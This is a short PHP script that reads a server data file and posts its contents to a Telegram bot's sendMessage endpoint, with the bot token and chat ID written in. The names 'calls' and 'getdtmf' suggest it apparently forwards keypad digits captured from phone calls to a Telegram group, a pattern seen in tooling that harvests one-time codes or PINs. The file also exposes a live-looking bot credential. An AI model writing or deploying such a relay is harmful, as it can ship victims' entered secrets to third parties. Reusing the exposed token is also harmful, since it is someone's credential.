#!/usr/bin/env php
<?php

$calls = file_get_contents("/var/www/html/data.txt");

if ($calls > 0) {
    getdtmf($calls);
}

function getdtmf($dtmf) {
    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://api.telegram.org/bot8178049394:AAGvWMrdWzJS0brFmCBL_dyUKk6ZMTGDwYY/sendMessage?chat_id=-1002347274383&text=' . urlencode($dtmf),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));
    
    $response = curl_exec($curl);
    
    curl_close($curl);
}

?>
